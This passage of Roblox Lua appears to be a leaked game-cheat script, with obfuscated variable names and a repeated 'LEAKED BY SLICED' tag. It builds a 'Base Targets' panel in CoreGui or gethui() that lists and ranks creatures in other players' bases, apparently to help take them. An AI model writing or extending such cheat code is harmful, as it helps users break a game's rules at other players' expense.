				if slicedn24 > 0 then  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedn25 = (slicedn17 + 4) * slicedn24 + 4
				else
					slicedn25 = 0

					if visible2 then
						slicedn25 = 26
					end
				end

				local slicedn26 = slicedn18 + slicedn25
				if sliced21 == slicedn26 then
					return  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
				sliced21 = slicedn26

				if sliced18 then
					if slicedn25 > 0 then
						sliced18.Visible = true
					end

					TweenService:Create(sliced18, tweenInfo, { Size = UDim2.new(1, -20, 0, math.max(slicedn25, 1)) }):Play()
				end

				local tween = TweenService:Create(sliced15, tweenInfo, { Size = UDim2.fromOffset(214, slicedn26) })

				if slicedn25 <= 0 and sliced18 then  -- LEAKED BY SLICED | discord.gg/pubmethod
					tween.Completed:Connect(function()
						if sliced18 and sliced21 == slicedn26 then
							sliced18.Visible = false
						end
					end)
				end

				tween:Play()
			end

			slicedfn29 = function()
				table.clear(tbl4)  -- LEAKED BY SLICED | discord.gg/pubmethod
				sliced15 = nil
				sliced16 = nil
				sliced17 = nil
				sliced18 = nil
				sliced20 = nil
				sliced21 = nil
				sliced22 = nil
				sliced19 = nil
				str3 = ""

				if screenGui3 then  -- LEAKED BY SLICED | discord.gg/pubmethod
					pcall(function()
						screenGui3:Destroy()
					end)

					screenGui3 = nil
				end
			end

			local function slicedfn34(arg, arg2)
				local debris = Workspace:FindFirstChild("Debris")
				if not debris or arg2 == "" then
					return nil  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
				local sliced26 = nil
				local sliced27 = nil

				for _, child in ipairs(debris:GetChildren()) do
					if child.Name == "FastOverheadTemplate" and child:IsA("BasePart") then
						local animalOverhead = child:FindFirstChild("AnimalOverhead")
						local displayName = animalOverhead and animalOverhead:FindFirstChild("DisplayName")

						if displayName and displayName:IsA("TextLabel") and displayName.Text == arg2 then
							local magnitude = (child.Position - arg.Position).Magnitude

							if not sliced26 or magnitude < sliced26 then  -- LEAKED BY SLICED | discord.gg/pubmethod
								sliced26 = magnitude
								sliced27 = animalOverhead
							end
						end
					end
				end

				if sliced27 and sliced26 and sliced26 <= 14 then
					return sliced27
				end
				return nil  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			local function slicedfn35(arg, arg2, arg3)
				if not (arg and arg2) or arg3 == "" then
					return nil
				end
				local sliced26 = nil
				local sliced27 = nil

				for _, child in ipairs(arg:GetChildren()) do
					if child:IsA("Model") and child.Name == arg3 then
						local ok, result = pcall(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
							return child:GetPivot()
						end)

						if ok then
							local magnitude = (result.Position - arg2.Position).Magnitude

							if not sliced26 or magnitude < sliced26 then
								sliced27 = child
								sliced26 = magnitude
							end
						end
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				if sliced27 and sliced26 and sliced26 <= 14 then
					return sliced27
				end
				return nil
			end

			local str4 = ""

			local function slicedfn36(arg, painted)
				if arg.Painted == painted then
					return  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
				arg.Painted = painted
				local ipairs = ipairs
				local tweens = arg.Tweens or {}

				for _, tween in ipairs(tweens) do
					pcall(function()
						tween:Cancel()
					end)
				end

				local tweens2 = {}  -- LEAKED BY SLICED | discord.gg/pubmethod
				local tween = TweenService:Create(arg.Accent, tweenInfo, { Size = UDim2.new(0, painted and 3 or 0, 1, -12) })
				local tween2 = TweenService:Create(arg.Stroke, tweenInfo, { Color = painted and color or Color3.fromRGB(255, 255, 255), Transparency = painted and 0.1 or 0.86 })
				local sliced27 = TweenService
				local create = sliced27.Create
				local row = arg.Row
				local tbl5 = { BackgroundTransparency = painted and 0.12 or 0.4 }
				local sliced28 = table.pack(create(sliced27, row, tweenInfo, tbl5))
				tweens2[1] = tween
				tweens2[2] = tween2

				do  -- LEAKED BY SLICED | discord.gg/pubmethod
					local values = table.pack(table.unpack(sliced28, 1, sliced28.n))
					table.move(values, 1, values.n, 3, tweens2)
				end

				arg.Tweens = tweens2

				for _, tween3 in ipairs(arg.Tweens) do
					tween3:Play()
				end
			end

			local function slicedfn37()
				for _, sliced26 in ipairs(tbl4) do  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedfn36(sliced26, prompt2 ~= nil and sliced26.Prompt == prompt2)
				end
			end

			local function slicedfn38(layoutOrder)
				local textButton = Instance.new("TextButton")
				textButton.AutoButtonColor = false
				textButton.BackgroundColor3 = Color3.fromRGB(30, 30, 36)
				textButton.BackgroundTransparency = 0.3
				textButton.BorderSizePixel = 0
				textButton.LayoutOrder = layoutOrder  -- LEAKED BY SLICED | discord.gg/pubmethod
				textButton.Size = UDim2.new(1, 0, 0, 40)
				textButton.Text = ""
				textButton.Parent = sliced16
				Instance.new("UICorner", textButton).CornerRadius = UDim.new(0, 9)
				local frame4 = Instance.new("Frame")
				frame4.AnchorPoint = Vector2.new(0, 0.5)
				frame4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				frame4.BorderSizePixel = 0
				frame4.Position = UDim2.new(0, 0, 0.5, 0)
				frame4.Size = UDim2.new(0, 0, 1, -12)  -- LEAKED BY SLICED | discord.gg/pubmethod
				frame4.ZIndex = 4
				frame4.Parent = textButton
				Instance.new("UICorner", frame4).CornerRadius = UDim.new(1, 0)
				local uiGradient = Instance.new("UIGradient")
				local new = ColorSequenceKeypoint.new
				local color2 = Color3.fromRGB
				uiGradient.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(58, 255, 55)), new(1, color2(20, 109, 0)) })
				uiGradient.Rotation = 90
				uiGradient.Parent = frame4
				local uiStroke = Instance.new("UIStroke")  -- LEAKED BY SLICED | discord.gg/pubmethod
				uiStroke.Thickness = 1.3
				uiStroke.Parent = textButton
				local viewportFrame = Instance.new("ViewportFrame")
				viewportFrame.Ambient = Color3.fromRGB(190, 190, 200)
				viewportFrame.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
				viewportFrame.BackgroundTransparency = 0.25
				viewportFrame.BorderSizePixel = 0
				viewportFrame.LightColor = Color3.fromRGB(255, 255, 255)
				viewportFrame.LightDirection = Vector3.new(-0.4, -0.7, -0.6)
				viewportFrame.Position = UDim2.fromOffset(4, 3)  -- LEAKED BY SLICED | discord.gg/pubmethod
				viewportFrame.Size = UDim2.fromOffset(slicedn17 - 6, slicedn17 - 6)
				viewportFrame.Parent = textButton
				Instance.new("UICorner", viewportFrame).CornerRadius = UDim.new(0, 8)
				local camera = Instance.new("Camera")
				camera.Parent = viewportFrame
				viewportFrame.CurrentCamera = camera
				local frame5 = Instance.new("Frame")
				frame5.AnchorPoint = Vector2.new(1, 1)
				frame5.BackgroundColor3 = Color3.fromRGB(10, 10, 13)
				frame5.BackgroundTransparency = 0.15  -- LEAKED BY SLICED | discord.gg/pubmethod
				frame5.BorderSizePixel = 0
				frame5.Position = UDim2.fromOffset(slicedn17 - 3, slicedn17 - 3)
				frame5.Size = UDim2.fromOffset(24, 13)
				frame5.ZIndex = 4
				frame5.Parent = textButton
				Instance.new("UICorner", frame5).CornerRadius = UDim.new(0, 5)
				local textLabel3 = Instance.new("TextLabel")
				textLabel3.BackgroundTransparency = 1
				textLabel3.Size = UDim2.fromScale(1, 1)
				textLabel3.Text = ""  -- LEAKED BY SLICED | discord.gg/pubmethod
				textLabel3.TextColor3 = Color3.fromRGB(255, 255, 255)
				textLabel3.TextScaled = true
				textLabel3.ZIndex = 5
				slicedfn30(textLabel3)
				textLabel3.Parent = frame5
				local uiStroke2 = Instance.new("UIStroke")
				uiStroke2.Color = Color3.fromRGB(0, 0, 0)
				uiStroke2.Thickness = 1.4
				uiStroke2.Transparency = 0.25
				uiStroke2.Parent = textLabel3  -- LEAKED BY SLICED | discord.gg/pubmethod
				local textLabel4 = Instance.new("TextLabel")
				textLabel4.BackgroundTransparency = 1
				textLabel4.Position = UDim2.fromOffset(slicedn17 + 2, 5)
				textLabel4.Size = UDim2.new(1, -slicedn17 - 10, 0, 13)
				textLabel4.Text = ""
				textLabel4.TextColor3 = Color3.fromRGB(238, 238, 242)
				textLabel4.TextScaled = true
				textLabel4.TextTruncate = Enum.TextTruncate.AtEnd
				textLabel4.TextXAlignment = Enum.TextXAlignment.Left
				slicedfn30(textLabel4)  -- LEAKED BY SLICED | discord.gg/pubmethod
				textLabel4.Parent = textButton
				local sliced26 = chilliGithubFastManualDefaultsRu.CreateBrainrotNameStyle(textLabel4)
				local textLabel5 = Instance.new("TextLabel")
				textLabel5.BackgroundTransparency = 1
				textLabel5.Position = UDim2.fromOffset(slicedn17 + 2, 20)
				textLabel5.Size = UDim2.fromOffset(62, 11)
				textLabel5.Text = ""
				textLabel5.TextColor3 = Color3.fromRGB(115, 255, 0)
				textLabel5.TextScaled = true
				textLabel5.TextXAlignment = Enum.TextXAlignment.Left  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedfn30(textLabel5)
				textLabel5.Parent = textButton
				local textLabel6 = Instance.new("TextLabel")
				textLabel6.BackgroundTransparency = 1
				textLabel6.Position = UDim2.fromOffset(slicedn17 + 66, 20)
				textLabel6.RichText = true
				textLabel6.Size = UDim2.fromOffset(62, 11)
				textLabel6.Text = ""
				textLabel6.TextScaled = true
				textLabel6.TextXAlignment = Enum.TextXAlignment.Left  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedfn30(textLabel6)
				textLabel6.Parent = textButton
				local frame6 = Instance.new("Frame")
				frame6.AnchorPoint = Vector2.new(1, 0)
				frame6.BackgroundTransparency = 1
				frame6.Position = UDim2.new(1, -7, 0, 19)
				frame6.Size = UDim2.fromOffset(44, 12)
				frame6.Parent = textButton
				local uiListLayout = Instance.new("UIListLayout")
				uiListLayout.FillDirection = Enum.FillDirection.Horizontal  -- LEAKED BY SLICED | discord.gg/pubmethod
				uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
				uiListLayout.Padding = UDim.new(0, 2)
				uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
				uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
				uiListLayout.Parent = frame6

				local tbl5 = {
					Row = textButton,
					Accent = frame4,
					Stroke = uiStroke,
					Viewport = viewportFrame,  -- LEAKED BY SLICED | discord.gg/pubmethod
					Camera = camera,
					Rank = textLabel3,
					NameLabel = textLabel4,
					NameStyle = sliced26,
					ValueLabel = textLabel5,
					MutationLabel = textLabel6,
					TraitHolder = frame6,
					Prompt = nil,
					RowKey = nil,
					ModelKey = nil,  -- LEAKED BY SLICED | discord.gg/pubmethod
					Clone = nil,
					Track = nil,
					SourceTrack = nil,
					Painted = nil,
					Tweens = nil,
				}

				slicedfn5(textButton, function()
					if not tbl5.Prompt then
						return
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					if prompt2 == tbl5.Prompt then
						prompt2 = nil
						str4 = ""
					else
						prompt2 = tbl5.Prompt
						str4 = tbl5.NameLabel.Text
						slicedfn27()
					end

					str3 = ""
					slicedfn37()  -- LEAKED BY SLICED | discord.gg/pubmethod
				end)

				return tbl5
			end

			local function slicedfn39()
				if screenGui3 and screenGui3.Parent then
					return
				end
				screenGui3 = Instance.new("ScreenGui")
				screenGui3.Name = "ChilliAutoGetTargetPanel"
				screenGui3.DisplayOrder = 5  -- LEAKED BY SLICED | discord.gg/pubmethod
				screenGui3.IgnoreGuiInset = true
				screenGui3.ResetOnSpawn = false
				screenGui3.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
				local parent = CoreGui

				if type(gethui) == "function" then
					local ok
					ok, parent = pcall(gethui)
					ok = ok and typeof(parent) == "Instance"
					local sliced26 = CoreGui

					if not ok then  -- LEAKED BY SLICED | discord.gg/pubmethod
						parent = sliced26
					end
				end

				screenGui3.Parent = parent
				local frame4 = Instance.new("Frame")
				frame4.Active = true
				frame4.AnchorPoint = Vector2.new(1, 0)
				frame4.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
				frame4.BackgroundTransparency = 0.18
				frame4.BorderSizePixel = 0  -- LEAKED BY SLICED | discord.gg/pubmethod
				frame4.Position = slicedfn31()
				frame4.Size = UDim2.fromOffset(214, 44)
				frame4.ClipsDescendants = true
				frame4.Parent = screenGui3
				Instance.new("UICorner", frame4).CornerRadius = UDim.new(0, 14)
				sliced15 = frame4
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Color = Color3.fromRGB(255, 255, 255)
				uiStroke.Thickness = 1
				uiStroke.Transparency = 0.9  -- LEAKED BY SLICED | discord.gg/pubmethod
				uiStroke.Parent = frame4
				local uiScale = Instance.new("UIScale")
				uiScale.Parent = frame4

				local function slicedfn40()
					local currentCamera = Workspace.CurrentCamera
					local viewportSize = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

					if viewportSize.X < 1 then
						viewportSize = Vector2.new(1280, 720)
					end

					uiScale.Scale = math.clamp(viewportSize.X * 0.15 / slicedn16, 0.7, 1.3) * slicedn20  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				sliced19 = slicedfn40
				slicedfn40()
				local currentCamera = Workspace.CurrentCamera

				if currentCamera then
					slicedfn4(currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(slicedfn40))
				end

				local textButton = Instance.new("TextButton")
				textButton.Name = "Handle"
				textButton.Active = true  -- LEAKED BY SLICED | discord.gg/pubmethod
				textButton.AutoButtonColor = false
				textButton.BackgroundTransparency = 1
				textButton.BorderSizePixel = 0
				textButton.Position = UDim2.fromOffset(0, 0)
				textButton.Size = UDim2.new(1, 0, 0, 44)
				textButton.Text = ""
				textButton.ZIndex = 2
				textButton.Parent = frame4
				local slicedfn41 = nil
				local flag11 = false  -- LEAKED BY SLICED | discord.gg/pubmethod
				local flag12 = nil
				local flag13 = false
				local vector2 = Vector2.new(0, 0)
				local vector22 = Vector2.new(0, 0)

				textButton.InputBegan:Connect(function(input)
					if flag11 or input.UserInputState ~= Enum.UserInputState.Begin then
						return
					end

					if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then
						return  -- LEAKED BY SLICED | discord.gg/pubmethod
					end
					local vector23 = Vector2.new(input.Position.X, input.Position.Y)
					local absolutePosition = textButton.AbsolutePosition
					local absoluteSize = textButton.AbsoluteSize
					if vector23.X < absolutePosition.X or vector23.X > absolutePosition.X + absoluteSize.X or vector23.Y < absolutePosition.Y or vector23.Y > absolutePosition.Y + absoluteSize.Y then
						return
					end

					for _, child in ipairs(textButton:GetChildren()) do
						if child:IsA("GuiButton") and child.Visible then
							local absolutePosition2 = child.AbsolutePosition  -- LEAKED BY SLICED | discord.gg/pubmethod
							local absoluteSize2 = child.AbsoluteSize
							if vector23.X >= absolutePosition2.X and vector23.X <= absolutePosition2.X + absoluteSize2.X and vector23.Y >= absolutePosition2.Y and vector23.Y <= absolutePosition2.Y + absoluteSize2.Y then
								return
							end
						end
					end

					local absoluteSize2 = screenGui3.AbsoluteSize
					if absoluteSize2.X <= 0 or absoluteSize2.Y <= 0 then
						return
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
					flag11 = true
					flag13 = false
					flag12 = input.UserInputType == Enum.UserInputType.Touch and input or nil
					vector2 = Vector2.new(input.Position.X, input.Position.Y)
					vector22 = Vector2.new(frame4.Position.X.Scale + frame4.Position.X.Offset / absoluteSize2.X, frame4.Position.Y.Scale + frame4.Position.Y.Offset / absoluteSize2.Y)
				end)

				slicedfn4(UserInputService2.InputChanged:Connect(function(input)
					if not flag11 then
						return
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					if not (flag12 and input == flag12 or not flag12 and input.UserInputType == Enum.UserInputType.MouseMovement) or not sliced15 then
						return
					end
					local absoluteSize = screenGui3.AbsoluteSize
					if absoluteSize.X <= 0 or absoluteSize.Y <= 0 then
						return
					end
					local slicedn24 = Vector2.new(input.Position.X, input.Position.Y) - vector2
					if not flag13 and slicedn24.Magnitude < 6 then
						return  -- LEAKED BY SLICED | discord.gg/pubmethod
					end
					flag13 = true
					frame4.Position = UDim2.fromScale(math.clamp(vector22.X + slicedn24.X / absoluteSize.X, math.min(math.max(frame4.AbsoluteSize.X / absoluteSize.X, 0), 0.998), 0.998), math.clamp(vector22.Y + slicedn24.Y / absoluteSize.Y, 0, 0.98))
				end))

				slicedfn4(UserInputService2.InputEnded:Connect(function(input)
					if not flag11 then
						return
					end

					if input.UserInputType == Enum.UserInputType.MouseButton1 or input == flag12 then
						flag11 = false  -- LEAKED BY SLICED | discord.gg/pubmethod
						flag12 = nil

						if flag13 then
							slicedfn32(frame4.Position)
						elseif slicedfn41 then
							slicedfn41()
						end
					end
				end))

				local textLabel3 = Instance.new("TextLabel")
				textLabel3.BackgroundTransparency = 1  -- LEAKED BY SLICED | discord.gg/pubmethod
				textLabel3.Position = UDim2.fromOffset(32, 8)
				textLabel3.Size = UDim2.fromOffset(slicedn16 - 102, 14)
				textLabel3.Text = "Base Targets"
				textLabel3.TextColor3 = Color3.fromRGB(240, 240, 244)
				textLabel3.TextScaled = true
				textLabel3.TextXAlignment = Enum.TextXAlignment.Left
				slicedfn30(textLabel3)
				textLabel3.Parent = textButton
				local textLabel4 = Instance.new("TextLabel")
				textLabel4.BackgroundTransparency = 1  -- LEAKED BY SLICED | discord.gg/pubmethod
				textLabel4.Position = UDim2.fromOffset(32, 23)
				textLabel4.Size = UDim2.fromOffset(slicedn16 - 102, 10)
				textLabel4.Text = "walk into a base"
				textLabel4.TextColor3 = Color3.fromRGB(140, 140, 150)
				textLabel4.TextScaled = true
				textLabel4.TextXAlignment = Enum.TextXAlignment.Left
				slicedfn30(textLabel4)
				textLabel4.Parent = textButton
				sliced17 = textLabel4
				local textButton2 = Instance.new("TextButton")  -- LEAKED BY SLICED | discord.gg/pubmethod
				textButton2.AnchorPoint = Vector2.new(0, 0.5)
				textButton2.AutoButtonColor = false
				textButton2.BackgroundTransparency = 1
				textButton2.BorderSizePixel = 0
				textButton2.Position = UDim2.new(0, 8, 0, math.floor(slicedn18 * 0.5))
				textButton2.Size = UDim2.fromOffset(20, 20)
				textButton2.Text = ""
				textButton2.ZIndex = 6
				textButton2.Parent = textButton
				local frame5 = Instance.new("Frame")  -- LEAKED BY SLICED | discord.gg/pubmethod
				frame5.AnchorPoint = Vector2.new(0.5, 0.5)
				frame5.BackgroundTransparency = 1
				frame5.BorderSizePixel = 0
				frame5.Position = UDim2.fromScale(0.5, 0.5)
				frame5.Size = UDim2.fromScale(0.62, 0.62)
				frame5.Parent = textButton2
				local uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
				uiAspectRatioConstraint.AspectRatio = 1
				uiAspectRatioConstraint.AspectType = Enum.AspectType.FitWithinMaxSize
				uiAspectRatioConstraint.DominantAxis = Enum.DominantAxis.Height  -- LEAKED BY SLICED | discord.gg/pubmethod
				uiAspectRatioConstraint.Parent = frame5

				for _, sliced26 in ipairs({ { 0.335355, 45 }, { 0.664645, -45 } }) do
					local frame6 = Instance.new("Frame")
					frame6.AnchorPoint = Vector2.new(0.5, 0.5)
					frame6.BackgroundColor3 = Color3.fromRGB(58, 255, 55)
					frame6.BorderSizePixel = 0
					frame6.Position = UDim2.fromScale(sliced26[1], 0.535355)
					frame6.Rotation = sliced26[2]
					frame6.Size = UDim2.fromScale(0.6657, 0.2)
					frame6.Parent = frame5  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				sliced22 = frame5
				frame5.Rotation = flag9 and 180 or 0

				slicedfn41 = function()
					flag9 = not flag9
					TweenService:Create(frame5, tweenInfo, { Rotation = flag9 and 180 or 0 }):Play()
					slicedfn33()
				end

				slicedfn5(textButton2, slicedfn41)
				local textButton3 = Instance.new("TextButton")  -- LEAKED BY SLICED | discord.gg/pubmethod
				textButton3.AnchorPoint = Vector2.new(1, 0)
				textButton3.AutoButtonColor = false
				textButton3.BackgroundColor3 = Color3.fromRGB(34, 34, 40)
				textButton3.BackgroundTransparency = 0.2
				textButton3.BorderSizePixel = 0
				textButton3.Position = UDim2.new(1, -10, 0, 8)
				textButton3.Size = UDim2.fromOffset(58, 20)
				textButton3.Text = ""
				textButton3.Parent = textButton
				Instance.new("UICorner", textButton3).CornerRadius = UDim.new(1, 0)  -- LEAKED BY SLICED | discord.gg/pubmethod
				local uiStroke2 = Instance.new("UIStroke")
				uiStroke2.Color = Color3.fromRGB(255, 255, 255)
				uiStroke2.Thickness = 1.2
				uiStroke2.Transparency = 0.78
				uiStroke2.Parent = textButton3
				local textLabel5 = Instance.new("TextLabel")
				textLabel5.BackgroundTransparency = 1
				textLabel5.Position = UDim2.fromOffset(9, 5)
				textLabel5.Size = UDim2.fromOffset(9, 10)
				textLabel5.Text = "X"  -- LEAKED BY SLICED | discord.gg/pubmethod
				textLabel5.TextColor3 = Color3.fromRGB(226, 226, 232)
				textLabel5.TextScaled = true
				slicedfn30(textLabel5)
				textLabel5.Parent = textButton3
				local textLabel6 = Instance.new("TextLabel")
				textLabel6.BackgroundTransparency = 1
				textLabel6.Position = UDim2.fromOffset(21, 5)
				textLabel6.Size = UDim2.fromOffset(30, 10)
				textLabel6.Text = "Clear"
				textLabel6.TextColor3 = Color3.fromRGB(226, 226, 232)  -- LEAKED BY SLICED | discord.gg/pubmethod
				textLabel6.TextScaled = true
				textLabel6.TextXAlignment = Enum.TextXAlignment.Left
				slicedfn30(textLabel6)
				textLabel6.Parent = textButton3

				local function slicedfn42(arg)
					local color2 = arg and Color3.fromRGB(255, 150, 150) or Color3.fromRGB(226, 226, 232)
					TweenService:Create(textButton3, tweenInfo, { BackgroundTransparency = arg and 0.05 or 0.2 }):Play()

					TweenService:Create(uiStroke2, tweenInfo, {
						Color = arg and Color3.fromRGB(255, 120, 120) or Color3.fromRGB(255, 255, 255),
						Transparency = arg and 0.25 or 0.78,  -- LEAKED BY SLICED | discord.gg/pubmethod
					}):Play()

					TweenService:Create(textLabel5, tweenInfo, { TextColor3 = color2 }):Play()
					TweenService:Create(textLabel6, tweenInfo, { TextColor3 = color2 }):Play()
				end

				textButton3.MouseEnter:Connect(function()
					slicedfn42(true)
				end)

				textButton3.MouseLeave:Connect(function()
					slicedfn42(false)
				end)  -- LEAKED BY SLICED | discord.gg/pubmethod

				slicedfn5(textButton3, function()
					prompt2 = nil
					str4 = ""
					str3 = ""
					slicedfn37()
				end)

				local frame6 = Instance.new("Frame")
				frame6.BackgroundTransparency = 1
				frame6.Position = UDim2.fromOffset(10, 40)
				frame6.Size = UDim2.new(1, -20, 0, (slicedn17 + 4) * (slicedn14 + 1))  -- LEAKED BY SLICED | discord.gg/pubmethod
				frame6.Parent = frame4
				local uiListLayout = Instance.new("UIListLayout")
				uiListLayout.FillDirection = Enum.FillDirection.Vertical
				uiListLayout.Padding = UDim.new(0, 4)
				uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
				uiListLayout.Parent = frame6
				sliced16 = frame6
				sliced18 = frame6
				local textLabel7 = Instance.new("TextLabel")
				textLabel7.BackgroundTransparency = 1  -- LEAKED BY SLICED | discord.gg/pubmethod
				textLabel7.LayoutOrder = 99
				textLabel7.Size = UDim2.new(1, 0, 0, 22)
				textLabel7.Text = ""
				textLabel7.TextColor3 = Color3.fromRGB(140, 140, 150)
				textLabel7.TextScaled = true
				textLabel7.Visible = false
				slicedfn30(textLabel7)
				textLabel7.Parent = frame6
				sliced20 = textLabel7
				table.clear(tbl4)  -- LEAKED BY SLICED | discord.gg/pubmethod

				for i_ = 1, slicedn14 + 1 do
					tbl4[i_] = slicedfn38(i_)
				end
			end

			local function slicedfn40(arg, arg2, arg3, arg4, arg5)
				local modelKey = tostring(arg5) .. "|" .. arg4
				if arg.ModelKey == modelKey and arg.Clone and arg.Clone.Parent then
					return
				end

				for _, child in ipairs(arg.Viewport:GetChildren()) do  -- LEAKED BY SLICED | discord.gg/pubmethod
					if not child:IsA("Camera") then
						child:Destroy()
					end
				end

				arg.Clone = nil
				arg.Track = nil
				arg.SourceTrack = nil
				if arg4 == "" then
					arg.ModelKey = modelKey
					return  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
				local sliced26 = slicedfn35(arg2, arg3, arg4)
				if not sliced26 then
					arg.ModelKey = nil
					return
				end
				arg.ModelKey = modelKey

				local ok, clone = pcall(function()
					return sliced26:Clone()
				end)  -- LEAKED BY SLICED | discord.gg/pubmethod

				if not ok or not clone then
					arg.ModelKey = nil
					return
				end

				for _, descendant in ipairs(clone:GetDescendants()) do
					if descendant:IsA("ParticleEmitter") or descendant:IsA("Beam") or descendant:IsA("Trail") or descendant:IsA("Light") or descendant:IsA("Sound") or descendant:IsA("Script") or descendant:IsA("LocalScript") then
						descendant:Destroy()
					end
				end

				local worldModel = Instance.new("WorldModel")  -- LEAKED BY SLICED | discord.gg/pubmethod
				worldModel.Parent = arg.Viewport
				clone.Parent = worldModel

				pcall(function()
					clone:PivotTo(CFrame.new())
				end)

				local ok2, result, result2 = pcall(function()
					return clone:GetBoundingBox()
				end)

				local sliced27 = ok2 and result2
				local slicedn24 = 4  -- LEAKED BY SLICED | discord.gg/pubmethod

				if sliced27 then
					slicedn24 = math.max(result2.X, result2.Y, result2.Z)
				end

				local slicedn25 = math.max(slicedn24 * 1.05, 3)
				ok2 = ok2 and result.Position or Vector3.zero
				arg.Camera.CFrame = CFrame.lookAt(ok2 + Vector3.new(slicedn25 * 0.28, slicedn25 * 0.08, -slicedn25), ok2, Vector3.new(0, 1, 0))
				arg.Clone = clone
				local humanoid = sliced26:FindFirstChildWhichIsA("Humanoid") or sliced26:FindFirstChildWhichIsA("AnimationController")
				humanoid = humanoid and humanoid:FindFirstChildOfClass("Animator")
				local humanoid2 = clone:FindFirstChildWhichIsA("Humanoid") or clone:FindFirstChildWhichIsA("AnimationController")  -- LEAKED BY SLICED | discord.gg/pubmethod
				humanoid2 = humanoid2 and humanoid2:FindFirstChildOfClass("Animator")
				if not (humanoid and humanoid2) then
					return
				end
				local playingAnimationTracks = humanoid:GetPlayingAnimationTracks()
				playingAnimationTracks = playingAnimationTracks and playingAnimationTracks[1]
				if not playingAnimationTracks or not playingAnimationTracks.Animation then
					return
				end
				local animation = Instance.new("Animation")  -- LEAKED BY SLICED | discord.gg/pubmethod
				animation.AnimationId = playingAnimationTracks.Animation.AnimationId

				local ok3, track = pcall(function()
					return humanoid2:LoadAnimation(animation)
				end)

				if ok3 and track then
					pcall(function()
						track.Looped = true
						track:Play(0)
						track.TimePosition = playingAnimationTracks.TimePosition
						track:AdjustSpeed(playingAnimationTracks.Speed)  -- LEAKED BY SLICED | discord.gg/pubmethod
					end)

					arg.Track = track
					arg.SourceTrack = playingAnimationTracks
				end
			end

			local function slicedfn41()
				for _, sliced26 in ipairs(tbl4) do
					local track = sliced26.Track
					local sourceTrack = sliced26.SourceTrack

					if track and sourceTrack and sliced26.Row.Visible then  -- LEAKED BY SLICED | discord.gg/pubmethod
						if not pcall(function()
							if not track.IsPlaying then
								track:Play(0)
							end

							if math.abs(track.TimePosition - sourceTrack.TimePosition) > 0.2 then
								track.TimePosition = sourceTrack.TimePosition
							end
						end) then
							sliced26.Track = nil
							sliced26.SourceTrack = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
						end
					end
				end
			end

			local function slicedfn42(arg, arg2)
				for _, child in ipairs(arg.TraitHolder:GetChildren()) do
					if child:IsA("ImageLabel") then
						child:Destroy()
					end
				end  -- LEAKED BY SLICED | discord.gg/pubmethod

				arg2 = arg2 and arg2:FindFirstChild("Traits")
				if not arg2 then
					return
				end
				local layoutOrder = 0

				for _, child in ipairs(arg2:GetChildren()) do
					if child:IsA("ImageLabel") and child.Visible and child.Image ~= "" and layoutOrder < 3 then
						layoutOrder += 1
						local imageLabel = Instance.new("ImageLabel")
						imageLabel.BackgroundTransparency = 1  -- LEAKED BY SLICED | discord.gg/pubmethod
						imageLabel.Image = child.Image
						imageLabel.LayoutOrder = layoutOrder
						imageLabel.Size = UDim2.fromOffset(12, 12)
						imageLabel.Parent = arg.TraitHolder
					end
				end
			end

			local function slicedfn43()
				if not flag10 then
					if screenGui3 then  -- LEAKED BY SLICED | discord.gg/pubmethod
						slicedfn29()
					end

					return
				end

				local now = os.clock()
				if now - slicedn21 < slicedn15 then
					return
				end
				slicedn21 = now
				local character_ = localPlayer.Character  -- LEAKED BY SLICED | discord.gg/pubmethod
				character_ = character_ and character_:FindFirstChild("HumanoidRootPart")
				if not character_ then
					slicedfn29()
					return
				end
				slicedfn39()
				slicedfn9(false)
				local sliced26 = nil
				local plot = nil

				for _, sliced27 in ipairs(tbl3) do  -- LEAKED BY SLICED | discord.gg/pubmethod
					if sliced27.Prompt.Parent then
						local magnitude = (character_.Position - sliced27.Spawn.Position).Magnitude

						if magnitude <= slicedn13 and (not sliced26 or magnitude < sliced26) then
							plot = sliced27.Plot
							sliced26 = magnitude
						end
					end
				end

				if plot then
					sliced23 = plot  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedn22 = now
				elseif sliced23 and sliced23.Parent and now - slicedn22 < 3 then
					plot = sliced23
				end

				local tbl5 = {}

				if plot then
					for _, sliced27 in ipairs(tbl3) do
						local prompt3 = sliced27.Prompt
						local parent = sliced27.Plot == plot and prompt3.Parent

						if parent then  -- LEAKED BY SLICED | discord.gg/pubmethod
							parent = tostring(prompt3.ObjectText or "") ~= ""
						end

						if parent then
							tbl5[#tbl5 + 1] = {
								Podium = sliced27,
								Distance = (character_.Position - sliced27.Spawn.Position).Magnitude,
								Generation = sliced27.Generation or 0,
							}
						end
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				local sliced27 = nil

				for _, sliced28 in ipairs(tbl5) do
					if not sliced27 or sliced28.Distance < sliced27.Distance then
						sliced27 = sliced28
					end
				end

				table.sort(tbl5, function(arg, arg2)
					return arg.Generation > arg2.Generation
